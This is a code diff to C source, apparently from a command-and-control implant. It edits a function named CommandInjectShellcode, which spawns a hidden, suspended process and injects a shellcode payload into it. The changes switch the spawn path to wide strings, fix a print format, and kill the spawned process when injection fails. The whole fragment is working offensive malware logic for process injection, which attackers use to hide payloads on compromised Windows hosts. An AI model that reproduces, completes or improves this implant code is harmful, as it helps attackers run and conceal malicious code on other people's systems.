@@ -1213,7 +1213,7 @@ VOID CommandInjectShellcode(
     PVOID     Argv    = NULL;
     DWORD     Argc    = 0;
     DWORD     Pid     = 0;
-    LPSTR     Spawn   = NULL;
+    LPWSTR    Spawn   = NULL;
     PROC_INFO PcInfo  = { 0 };
 
     /* create response package */
@@ -1254,14 +1254,19 @@ VOID CommandInjectShellcode(
                 Spawn = Instance.Config.Process.Spawn86;
             }
 
-            PRINTF( "Target spawn process: %s\n", Spawn )
+            PRINTF( "Target spawn process: %ls\n", Spawn )
 
             /* create process */
             if ( ProcessCreate( ( ! x64 ), NULL, Spawn, CREATE_NO_WINDOW | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, &PcInfo, FALSE, NULL ) ) {
                 PRINTF( "ProcessId is %d\n", PcInfo.dwProcessId );
 
                 /* inject code */
-                Status = Inject( Method, PcInfo.hProcess, 0, x64, Payload, Size, U_PTR( NULL ), Argv, Argc );
+                Status = Inject( Method, PcInfo.hProcess, 0, x64, Payload, Size, 0, Argv, Argc );
+
+                /* terminate process if injection failed */
+                if ( Status != INJECT_ERROR_SUCCESS ) {
+                    ProcessTerminate( PcInfo.hProcess, 0 );
+                }
 
                 /* close process handle */
                 if ( PcInfo.hProcess ) {
